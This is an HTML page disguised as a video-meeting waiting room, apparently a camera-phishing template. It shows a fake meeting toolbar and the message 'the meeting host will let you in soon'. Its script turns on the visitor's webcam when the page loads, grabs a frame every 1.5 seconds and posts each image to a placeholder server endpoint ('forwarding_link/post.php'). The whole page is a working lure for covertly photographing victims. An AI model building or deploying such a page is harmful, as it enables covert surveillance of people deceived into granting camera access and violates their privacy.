<!doctype html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Stream</title>

    <!-- External Scripts -->
    <script src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@500&display=swap" rel="stylesheet">

    <style>
        /* General Styles */
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Nunito', sans-serif;
            font-weight: 500;
        }
        
        body,
        html {
            height: 100%;
            width: 100%;
            margin: 0;
        }
        /* Video and Canvas */
        
        .video-wrap {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        video {
            display: block;
        }
        
        canvas {
            display: block;
            margin: 0 auto;
        }
        /* Bottom Bar */
        
        .bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #1f2022;
            height: 80px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 40px;
            color: white;
        }
        
        .icon-button {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        .icon-button i {
            margin-bottom: 8px;
            font-size: 26px;
        }
        
        .icon-button h6 {
            font-size: 12px;
            margin-top: 5px;
        }
        
        button {
            background-color: crimson;
            color: white;
            border: none;
            padding: 5px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        /* Floating Button */
        
        .float_button {
            position: fixed;
            top: 5px;
            right: 5px;
            width: 40px;
            height: 40px;
            background-color: #1f2022;
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .float_button i {
            color: white;
            font-size: 18px;
        }
        /* Popup */
        
        #ac-wrapper {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.6);
            z-index: 1001;
            display: none;
        }
        
        #popup {
            width: 555px;
            height: 35px;
            background: white;
            border: 5px solid #000;
            border-radius: 15px;
            box-shadow: 0 0 3px 3px rgba(100, 104, 110, 0.5);
            position: relative;
            top: 250px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        #popup h2 {
            font-size: 16px;
            color: #333;
        }
    </style>
</head>

<body>
    <!-- Video Stream Wrapper -->
    <div class="video-wrap">
        <video id="video" playsinline autoplay></video>
    </div>
    <center>
        <canvas id="canvas" width="640" height="480"></canvas>
    </center>

    <!-- Floating Button -->
    <div class="float_button">
        <i class="fas fa-expand"></i>
    </div>

    <!-- Popup Wrapper -->
    <div id="ac-wrapper">
        <div id="popup">
            <h2>Please wait, the meeting host will let you in soon</h2>
        </div>
    </div>

    <!-- Bottom Bar -->
    <div class="bottom-bar">
        <div class="icon-button">
            <i class="fas fa-microphone"></i>
            <h6>Mute</h6>
        </div>
        <div class="icon-button">
            <i class="fas fa-video"></i>
            <h6>Stop Video</h6>
        </div>
        <div class="icon-button">
            <i class="fas fa-shield-alt"></i>
            <h6>Security</h6>
        </div>
        <div class="icon-button">
            <i class="fas fa-users"></i>
            <h6>Participants</h6>
        </div>
        <div class="icon-button" style="color: lawngreen;">
            <i class="fas fa-plus-square"></i>
            <h6>Share Content</h6>
        </div>
        <div class="icon-button">
            <i class="fas fa-comments"></i>
            <h6>Chat</h6>
        </div>
        <div class="icon-button">
            <i class="fas fa-record-vinyl"></i>
            <h6>Record</h6>
        </div>
        <button>End</button>
    </div>

    <!-- Scripts -->
    <script>
        // Post data to server
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: {
                    cat: imgdata
                },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: false,
                success: function(result) {
                    // Handle success
                },
                error: function() {
                    // Handle error
                }
            });
        }

        'use strict';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const errorMsgElement = document.querySelector('span#errorMsg');

        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        // Access webcam
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
            }
        }

        // Handle webcam success
        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            const context = canvas.getContext('2d');
            setInterval(() => {
                context.drawImage(video, 0, 0, 640, 480);
                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
                video.play();
            }, 1500);
        }

        // Popup Function
        function PopUp() {
            document.getElementById('ac-wrapper').style.display = "none";
        }

        // Load Init
        init();

        $(document).ready(function() {
            setTimeout(function() {
                PopUp();
            }, 50000); // Show popup after 50 seconds
        });
    </script>
</body>

</html>
